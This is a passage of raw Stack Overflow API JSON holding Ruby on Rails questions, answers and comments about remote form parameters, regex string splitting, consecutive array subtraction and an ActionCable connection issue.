1535539006, "post_id": 52068411, "comment_id": 91100316, "body": "im not sure where i got that whole <code>name: nil</code> lol. but its a simple remote form, i find it strange that i cant get the forms params with a remote: true on form. im really confused."}], "answers": [{"tags": [], "owner": {"reputation": 14213, "user_id": 398863, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4CNtJ.png?s=128&g=1", "display_name": "Amit Patel", "link": "https://stackoverflow.com/users/398863/amit-patel"}, "is_accepted": true, "score": 0, "last_activity_date": 1535510100, "creation_date": 1535510100, "answer_id": 52068699, "question_id": 52068411, "link": "https://stackoverflow.com/questions/52068411/does-remote-true-effect-how-parameters-are-sent-to-the-controller/52068699#52068699", "title": "Does remote: true effect how parameters are sent to the controller?", "body": "<p>From the log I see that there are 2 request on <code>index</code> action. </p>\n\n<p>One without query parameter which I am sure you are hitting the <code>index</code> page without query. Another is with query param. You will always get <code>nil</code> with former one as because you are not passing anything in the request.</p>\n\n<p>So ideally you should list all resources when search term is not found. So I would suggest solution similar to</p>\n\n<pre><code>def index\n    @search_term = params[:query] #value is nil\n    if @search_term.present?\n      gon.queries = Query.api_response(@search_term)\n    else\n      gon.queries = {} # Or anything which makes sense when search term is not found\n    end\n    respond_to do |format|\n      format.js\n      format.html\n    end\nend\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 3499671, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Uos2y.png?s=128&g=1", "display_name": "Jumping Jack", "link": "https://stackoverflow.com/users/3499671/jumping-jack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "accepted_answer_id": 52068699, "answer_count": 1, "score": 0, "last_activity_date": 1535510100, "creation_date": 1535507384, "question_id": 52068411, "link": "https://stackoverflow.com/questions/52068411/does-remote-true-effect-how-parameters-are-sent-to-the-controller", "title": "Does remote: true effect how parameters are sent to the controller?", "body": "<p>I have been struggling with this for the past two days now, and i'm stumped. I have a simple <code>form_tag</code> that submits with ajax using <code>remote: true</code> helper. I've been trying to access the value from the form in the controller using <code>params[:query]</code> but I keep getting <code>nil</code>. </p>\n\n<p><strong>_form.html.erb</strong></p>\n\n<pre><code>&lt;%= form_tag queries_path, method: :get, remote: true do %&gt;\n    &lt;%= text_field_tag :query %&gt;&lt;br&gt;\n    &lt;%= submit_tag 'Search', name: nil, class: 'submit' %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Above: Seems to be pretty straight forward I believe.</p>\n\n<p><strong>queries_controller.rb</strong></p>\n\n<pre><code>def index\n    @search_term = params[:query] #value is nil\n\n    gon.queries = Query.api_response(@search_term)\n    respond_to do |format|\n      format.js\n      format.html\n    end\n  end\n</code></pre>\n\n<p><strong>application.html.erb</strong></p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"//cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css\"&gt;\n    &lt;%= stylesheet_link_tag    \"application\" %&gt;\n    &lt;%= Gon::Base.render_data %&gt;\n    &lt;%= include_gon(:init =&gt; true) %&gt;\n    &lt;%= javascript_include_tag \"application\" %&gt;\n    &lt;%= csrf_meta_tags %&gt;\n        &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;\n        &lt;script src=\"https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js\"&gt;&lt;/script&gt;\n        &lt;script src=\"https://cdn.datatables.net/plug-ins/1.10.19/api/sum().js\"&gt;&lt;/script&gt;\n        &lt;link href=\"https://fonts.googleapis.com/css?family=Righteous\" rel=\"stylesheet\"&gt;\n  &lt;/head&gt;\n\n  &lt;%= render 'shared/nav' %&gt;\n\n  &lt;body&gt;\n    &lt;p class=\"notice\"&gt;&lt;%= notice %&gt;&lt;/p&gt;\n    &lt;p class=\"alert\"&gt;&lt;%= alert %&gt;&lt;/p&gt;\n\n    &lt;%= yield %&gt;\n\n  &lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n\n<p><strong>Console log</strong></p>\n\n<pre><code>Started GET \"/queries\" for 148.75.220.61 at 2018-08-29 01:26:01 +0000\nCannot render console from 148.75.220.61! Allowed networks: 127.0.0.1, ::1, 127.0.0.0/127.255.255.255\nProcessing by QueriesController#index as HTML\n  Rendering queries/index.html.erb within layouts/application\n  User Load (0.8ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"id\" = $1 ORDER BY \"users\".\"id\" ASC LIMIT $2  [[\"id\", 1], [\"LIMIT\", 1]]\n  Rendered shared/_form.html.erb (1.3ms)\n  Rendered queries/index.html.erb within layouts/application (6.9ms)\n  Rendered shared/_nav.html.erb (1.5ms)\nCompleted 200 OK in 1180ms (Views: 113.7ms | ActiveRecord: 0.8ms)\n\n\nStarted GET \"/queries?utf8=%E2%9C%93&amp;query=egg&amp;search=\" for 148.75.220.61 at 2018-08-29 01:26:07 +0000\nCannot render console from 148.75.220.61! Allowed networks: 127.0.0.1, ::1, 127.0.0.0/127.255.255.255\nProcessing by QueriesController#index as JS\n  Parameters: {\"utf8\"=&gt;\"\u2713\", \"query\"=&gt;\"egg\", \"search\"=&gt;\"\"}\n  Rendering queries/index.js.erb\n  Rendered queries/index.js.erb (0.8ms)\nCompleted 200 OK in 1132ms (Views: 6.6ms | ActiveRecord: 0.0ms)\n</code></pre>\n\n<p>I notice when the <code>remote: true</code> method helper isn't in the form i'm able to access the form's parameters in the controller, but this requires the page to load and a lose of the params. I feel like maybe i'm missing something. Any help will be greatly appreciated.</p>\n"}, {"tags": ["ruby", "string", "split"], "comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 5, "creation_date": 1535505555, "post_id": 52068107, "comment_id": 91086451, "body": "Please edit so you have valid Ruby objects for variables that equal strings: <code>v1=&quot;a&quot;</code>, <code>v3-&quot;d&quot;</code>, and so on. Also, you need `str = &#39;a,{...g&#39; (single quotes) or escape the double quotes within the string."}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535520673, "post_id": 52068107, "comment_id": 91089905, "body": "Your string in not a valid Ruby object."}, {"owner": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "edited": false, "score": 0, "creation_date": 1535553019, "post_id": 52068107, "comment_id": 91109863, "body": "Hi Sawa, this is the reason why I post this here and this is not an object but a valid string."}, {"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1535576955, "post_id": 52068107, "comment_id": 91122530, "body": "No, it is not, it is a <code>SyntaxError</code>."}, {"owner": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "edited": false, "score": 0, "creation_date": 1535644884, "post_id": 52068107, "comment_id": 91153213, "body": "Hi Jorg/sawa, This is where the challenge is. I&#39;m trying to give a meaning to the scrap data that we&#39;re getting from the 3rd party and I just don&#39;t wish to reply that this is not a ruby object or it&#39;s a syntax error. sometimes we need to think outside of the box to solve some problems. agree? not sure what you guys found wrong in my question."}], "answers": [{"comments": [{"owner": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "edited": false, "score": 0, "creation_date": 1535509276, "post_id": 52068484, "comment_id": 91087201, "body": "wow!! that worked. but I&#39;m still trying to understand what&#39;s going on in these simple 8 lines of code. Thanks a lot !!"}, {"owner": {"reputation": 25637, "user_id": 6243352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/715f60f9edc65642a6805752cfeebb27?s=128&d=identicon&r=PG&f=1", "display_name": "ggorlen", "link": "https://stackoverflow.com/users/6243352/ggorlen"}, "reply_to_user": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "edited": false, "score": 1, "creation_date": 1535510147, "post_id": 52068484, "comment_id": 91087354, "body": "Sure, glad it worked. It&#39;s a bit of a hack because I&#39;m pretty sure there&#39;s a regex-only solution. I can post a regex breakdown if that helps."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1535518153, "post_id": 52068484, "comment_id": 91089093, "body": "Kat, this works? You show <code>v2</code> and <code>v8</code> set equal to hashes and <code>v5</code> set equal to an array. This answer computes only strings."}, {"owner": {"reputation": 25637, "user_id": 6243352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/715f60f9edc65642a6805752cfeebb27?s=128&d=identicon&r=PG&f=1", "display_name": "ggorlen", "link": "https://stackoverflow.com/users/6243352/ggorlen"}, "edited": false, "score": 0, "creation_date": 1535520064, "post_id": 52068484, "comment_id": 91089678, "body": "Or maybe not, since the snippet isn&#39;t valid JSON (array with keys?)."}, {"owner": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "edited": false, "score": 0, "creation_date": 1535552940, "post_id": 52068484, "comment_id": 91109810, "body": "Thank you Cary and Ggornel, The above solution worked for me. After the string is split into values I&#39;m parsing the JSON for v2, v8. I mean each value is handled independently."}], "tags": [], "owner": {"reputation": 25637, "user_id": 6243352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/715f60f9edc65642a6805752cfeebb27?s=128&d=identicon&r=PG&f=1", "display_name": "ggorlen", "link": "https://stackoverflow.com/users/6243352/ggorlen"}, "is_accepted": true, "score": 1, "last_activity_date": 1618089648, "last_edit_date": 1618089648, "creation_date": 1535508169, "answer_id": 52068484, "question_id": 52068107, "link": "https://stackoverflow.com/questions/52068107/split-string-by-comma-but-exclude-commas-in-brackets/52068484#52068484", "title": "Split string by comma but exclude commas in brackets", "body": "<p>Assuming you have a valid, single-quoted string, here's an option that works for your test input but may run into trouble with nesting, which regex <a href=\"https://stackoverflow.com/questions/133601/can-regular-expressions-be-used-to-match-nested-patterns\">has difficulty matching</a>.</p>\n<pre><code>str = '99,{b:[&quot;a1&quot;:&quot;0&quot;,&quot;s1&quot;:&quot;0&quot;],c:[{&quot;a2&quot;:&quot;0&quot;,&quot;s2&quot;:&quot;0&quot;}]},-98,97,[11,22,33],96,-95,{&quot;b2&quot;:&quot;3&quot;}'\n\nputs (str.split(/,(?![^\\[]*\\])/).inject([]) do |a, e|\n  if e.count(&quot;{&quot;) &lt; e.count(&quot;}&quot;)\n    a[-1] += &quot;,&quot; + e\n  else\n    a &lt;&lt; e\n  end\n  a\nend)\n</code></pre>\n<p>Output:</p>\n<pre class=\"lang-none prettyprint-override\"><code>99\n{b:[&quot;a1&quot;:&quot;0&quot;,&quot;s1&quot;:&quot;0&quot;],c:[{&quot;a2&quot;:&quot;0&quot;,&quot;s2&quot;:&quot;0&quot;}]}\n-98\n97\n[11,22,33]\n96\n-95\n{&quot;b2&quot;:&quot;3&quot;}\n</code></pre>\n<p>The idea here is to do a regex split on any commas not inside brackets using a negative lookahead, then combine any hashes that have extra <code>}</code>s with the rest of their structure.</p>\n"}], "owner": {"reputation": 121, "user_id": 7082648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6161177576ed098ad9f9cbb56d5eea6?s=128&d=identicon&r=PG&f=1", "display_name": "Ravi", "link": "https://stackoverflow.com/users/7082648/ravi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 189, "favorite_count": 0, "accepted_answer_id": 52068484, "answer_count": 1, "score": -2, "last_activity_date": 1618089648, "creation_date": 1535504560, "last_edit_date": 1535520651, "question_id": 52068107, "link": "https://stackoverflow.com/questions/52068107/split-string-by-comma-but-exclude-commas-in-brackets", "title": "Split string by comma but exclude commas in brackets", "body": "<p>I have a string:</p>\n\n<pre><code>str = \"99,{b:[\"a1\":\"0\",\"s1\":\"0\"],c:[{\"a2\":\"0\",\"s2\":\"0\"}]},-98,97,[11,22,33],96,-95,{\"b2\":\"3\"}\"\n</code></pre>\n\n<p>I want to split it as below:</p>\n\n<pre><code>v1= 99\nv2 = {b:[\"a1\": \"0\", \"s1\": \"0\"],c:[{\"a2\": \"0\", \"s2\": \"0\"}]}\nv3 = -98\nv4 = 97\nv5 = [11,22,33]\nv6 = 96\nv7 = -95\nv8 = {\"b2\":\"3\"}\n</code></pre>\n\n<p>I have this regex to get the contents of <code>v2</code>:</p>\n\n<pre><code>str[/\\{.*?\\}]}/]\n</code></pre>\n\n<p>but I cannot get the other content details.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "answers": [{"comments": [{"owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535525635, "post_id": 52067867, "comment_id": 91092053, "body": "The conditional works with this. But falls short of the &lt;%= (e.total[i] - e.total[index+1]) %&gt; line."}], "tags": [], "owner": {"reputation": 893, "user_id": 3394889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a3c58b23ce03f0e71522820d13404d5a?s=128&d=identicon&r=PG&f=1", "display_name": "The Wizard", "link": "https://stackoverflow.com/users/3394889/the-wizard"}, "is_accepted": false, "score": 4, "last_activity_date": 1535502461, "creation_date": 1535502461, "answer_id": 52067867, "question_id": 52067318, "link": "https://stackoverflow.com/questions/52067318/subtract-current-item-with-next-indexed-item/52067867#52067867", "title": "Subtract current item with next indexed item", "body": "<p>I think there is an easier way of doing that. Look at the following example.</p>\n\n<pre><code># An array of 5 random numbers\na =  [7,12,1,2,3]\n\n# Iterate through the indices of the array\na.each_index do |i|\n    # We only show the result of a[i+1] - a[i]\n    # given i+1 is still in range of the array\n    puts \"#{a[i+1] - a[i]}\" if (i+1) &lt; a.length\nend\n</code></pre>\n\n<p>This should output  <code>5 -11 1 1</code> each on a new line.</p>\n\n<p>Similarly, you could do something like this:</p>\n\n<pre><code>&lt;% @trial.methods.each_index do |i| %&gt;\n  &lt;% if i + 1 &lt; e.total.length %&gt;\n    &lt;%= (e.total[i] - e.total[index+1]) %&gt;\n  &lt;% else %&gt;\n    &lt;%= 0 %&gt;\n  &lt;% end %&gt;\n&lt;% end %&gt;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535512918, "post_id": 52068768, "comment_id": 91087889, "body": "I get the following error: undefined method `reduce&#39; for 0.1:Float"}, {"owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "reply_to_user": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535517806, "post_id": 52068768, "comment_id": 91089019, "body": "You have to run it on an Enumerable (like an Array). Can you show the code that you&#39;re trying to run ?"}, {"owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535518941, "post_id": 52068768, "comment_id": 91089323, "body": "I think the problem is that there are associations involved."}, {"owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "reply_to_user": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535520124, "post_id": 52068768, "comment_id": 91089701, "body": "Sorry, I didn&#39;t include an example for your specific case. I updated the answer"}, {"owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535525202, "post_id": 52068768, "comment_id": 91091827, "body": "This works, but not quite what I was looking for. Maybe should of explained in more detail that I have other objects reliant on the loop as well. Doing .map just does&#39;t suit my needs. Thanks for the help."}], "tags": [], "owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "is_accepted": false, "score": 0, "last_activity_date": 1535520102, "last_edit_date": 1535520102, "creation_date": 1535510720, "answer_id": 52068768, "question_id": 52067318, "link": "https://stackoverflow.com/questions/52067318/subtract-current-item-with-next-indexed-item/52068768#52068768", "title": "Subtract current item with next indexed item", "body": "<p>You can use Enumerable#reduce to achieve this:</p>\n\n<pre><code>a =  [7,12,1,2,3]\na.reduce(&amp;:-) # -11\n</code></pre>\n\n<p>So for your case:</p>\n\n<pre><code>@trial.methods.map{|e| e.total}.reduce(&amp;:-)\n</code></pre>\n\n<p>See <a href=\"https://ruby-doc.org/core-2.2.3/Enumerable.html#method-i-reduce\" rel=\"nofollow noreferrer\">https://ruby-doc.org/core-2.2.3/Enumerable.html#method-i-reduce</a> on its usage</p>\n"}, {"comments": [{"owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535525215, "post_id": 52068851, "comment_id": 91091837, "body": "This works, but not quite what I was looking for. Maybe should of explained in more detail that I have other objects reliant on the loop as well. Doing .map just does&#39;t suit my needs. Thanks for the help."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "reply_to_user": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "edited": false, "score": 0, "creation_date": 1535528339, "post_id": 52068851, "comment_id": 91093639, "body": "Consider to add a sample of input array and the expected result, I could add an edit."}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 2, "last_activity_date": 1535523701, "last_edit_date": 1535523701, "creation_date": 1535511471, "answer_id": 52068851, "question_id": 52067318, "link": "https://stackoverflow.com/questions/52067318/subtract-current-item-with-next-indexed-item/52068851#52068851", "title": "Subtract current item with next indexed item", "body": "<p>Use <a href=\"https://ruby-doc.org/core-2.5.1/Enumerable.html#method-i-each_cons\" rel=\"nofollow noreferrer\">#each_cons</a> to build a subarray of consecutive pairs, then map it:</p>\n\n<pre><code>array = [7,12,1,2,3]\n\narray.each_cons(2).map{ |e| e.last - e.first }\n\n# =&gt; [5, -11, 1, 1]\n</code></pre>\n\n<p>A slight alternative:</p>\n\n<pre><code>array.each_cons(2).map{ |a, b| b - a }\n</code></pre>\n\n<p>Of course, you can change to <code>a - b</code> or whatever you need.</p>\n\n<p>The first part does this:</p>\n\n<pre><code>array.each_cons(2).each {|e| p e}\n\n# =&gt; [7, 12]\n# =&gt; [12, 1]\n# =&gt; [1, 2]\n# =&gt; [2, 3]\n</code></pre>\n"}], "owner": {"reputation": 1009, "user_id": 3373464, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/OYNGU.jpg?s=128&g=1", "display_name": "DollarChills", "link": "https://stackoverflow.com/users/3373464/dollarchills"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1535550574, "creation_date": 1535497581, "last_edit_date": 1535550574, "question_id": 52067318, "link": "https://stackoverflow.com/questions/52067318/subtract-current-item-with-next-indexed-item", "title": "Subtract current item with next indexed item", "body": "<p>I'm trying to subtract the current item in the loop with the next indexed item, but I'm just getting the following error: <strong>undefined method `[]' for 0.0:Float</strong></p>\n\n<pre><code>&lt;% @trial.methods.each_with_index do |e, index| %&gt;\n  &lt;%= (e.total - e.total[index+1]) %&gt;&lt;br /&gt;\n  &lt;%= Time.at(e.try(:assessment).try(:assessment_date)/1000).strftime(\"%d/%m/%Y\") %&gt;&lt;br /&gt;\n  &lt;%= e.try(:assessment).try(:degrees) %&gt;\n&lt;% end %&gt;\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "actioncable"], "comments": [{"owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535489989, "post_id": 52066041, "comment_id": 91082655, "body": "do you see any error on the browser&#39;s console or the server console? You can inspect websocket connections on the browser&#39;s Network tab too"}, {"owner": {"reputation": 21, "user_id": 8836940, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjxuUlSfDP0/AAAAAAAAAAI/AAAAAAAAABI/7bS5hTyuiLE/photo.jpg?sz=128", "display_name": "salma negm", "link": "https://stackoverflow.com/users/8836940/salma-negm"}, "reply_to_user": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535530284, "post_id": 52066041, "comment_id": 91094775, "body": "No errors on the browser&#39;s console or the server."}, {"owner": {"reputation": 21, "user_id": 8836940, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjxuUlSfDP0/AAAAAAAAAAI/AAAAAAAAABI/7bS5hTyuiLE/photo.jpg?sz=128", "display_name": "salma negm", "link": "https://stackoverflow.com/users/8836940/salma-negm"}, "reply_to_user": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535531829, "post_id": 52066041, "comment_id": 91095739, "body": "by inspecting my websocket connection on the browser&#39;s Network tab It seems to be pending for ever"}, {"owner": {"reputation": 3429, "user_id": 1414327, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/xcgRQ.jpg?s=128&g=1", "display_name": "Asnad Atta", "link": "https://stackoverflow.com/users/1414327/asnad-atta"}, "edited": false, "score": 0, "creation_date": 1564403849, "post_id": 52066041, "comment_id": 101007755, "body": "hey did you find the solution I&#39;m getting same issue. disconnected is called directly it never gets into connected."}], "owner": {"reputation": 21, "user_id": 8836940, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjxuUlSfDP0/AAAAAAAAAAI/AAAAAAAAABI/7bS5hTyuiLE/photo.jpg?sz=128", "display_name": "salma negm", "link": "https://stackoverflow.com/users/8836940/salma-negm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 638, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1535531477, "creation_date": 1535489505, "last_edit_date": 1535531477, "question_id": 52066041, "link": "https://stackoverflow.com/questions/52066041/actioncable-connect-excuted-but-connected-is-not", "title": "ActionCable - connect excuted but connected is not", "body": "<p>I am using ActionCable with rails to create realtime notifications. The connect method in ApplicationCable::Connection is excuted, But connected callback in client-side is not!</p>\n\n<p>These are my files:</p>\n\n<p><strong><em>app/channels/connection.rb</em></strong></p>\n\n<pre><code>module ApplicationCable\n  class Connection &lt; ActionCable::Connection::Base\n    identified_by :current_user\n\n    def connect\n      self.current_user = find_verified_user\n    end\n\n    private\n      def find_verified_user\n        if current_user = User.last\n          current_user\n        else\n          reject_unauthorized_connection\n        end\n      end\n  end\nend\n</code></pre>\n\n<p><strong><em>app/channels/order_channel.rb</em></strong></p>\n\n<pre><code>class OrderChannel &lt; ApplicationCable::Channel\n  def subscribed\n    stream_from \"order_channel\"\n  end\n\n  def unsubscribed\n    # Any cleanup needed when channel is unsubscribed\n  end\n\n  def speak_m(data)\n    ActionCable.server.broadcast('order_channel', data)\n  end\nend\n</code></pre>\n\n<p><strong><em>app/assets/javascripts/cable.js</em></strong></p>\n\n<pre><code>// Action Cable provides the framework to deal with WebSockets in Rails.\n// You can generate new channels where WebSocket features live using the `rails generate channel` command.\n//\n//= require action_cable\n//= require_self\n//= require_tree ./channels\n\n(function() {\n  this.App || (this.App = {});\n\n  App.cable = ActionCable.createConsumer();\n\n}).call(this);\n</code></pre>\n\n<p><strong><em>app/assets/javascripts/cable/subscriptions/order.coffee</em></strong></p>\n\n<pre><code>App.order = App.cable.subscriptions.create \"OrderChannel\",\n  connected: -&gt;\n    @speak_m()\n\n    # Called when the subscription is ready for use on the server\n\n  disconnected: -&gt;\n    alert 'disconnected disconnected disconnected'\n    # Called when the subscription has been terminated by the server\n\n  received: (data) -&gt;\n    # Called when there's incoming data on the websocket for this channel\n    alert data\n\n  speak_m: -&gt;\n    @perform(\"speak_m\", 'My Message!!')\n</code></pre>\n\n<p><strong><em>config/application.rb</em></strong></p>\n\n<pre><code>require_relative 'boot'\n\nrequire 'rails/all'\n\n# Require the gems listed in Gemfile, including any gems\n# you've limited to :test, :development, or :production.\nBundler.require(*Rails.groups)\n\nmodule Web\n  class Application &lt; Rails::Application\n    # Initialize configuration defaults for originally generated Rails version.\n    config.load_defaults 5.1\n\n    config.action_cable.mount_path = '/cable'\n\n    # Settings in config/environments/* take precedence over those specified here.\n    # Application configuration should go into files in config/initializers\n    # -- all .rb files in that directory are automatically loaded.\n  end\nend\n</code></pre>\n\n<p><strong><em>config/cable.yml</em></strong></p>\n\n<pre><code>development:\n  adapter: async\n\ntest:\n  adapter: async\n</code></pre>\n\n<p>I added <code>&lt;%= action_cable_meta_tag %&gt;</code> to the layout</p>\n\n<p>and added  <code>mount ActionCable.server =&gt; '/cable'</code> to routes.rb</p>\n\n<p>I am using:\n   - ruby 2.3\n   - rails 5.1.4\n   - puma 3.7\n   - postgres 9.6</p>\n\n<p>I am using docker</p>\n"}, {"tags": ["arrays", "ruby", "collections"], "comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1535501833, "post_id": 52065874, "comment_id": 91085746, "body": "If all the elements (arrays) are the same size, as in your example, one way is <code>arr.transpose.first</code>."}], "answers": [{"comments": [{"owner": {"reputation": 16237, "user_id": 2166798, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/417356917295f5176d2a3e7c21d8f9e8?s=128&d=identicon&r=PG", 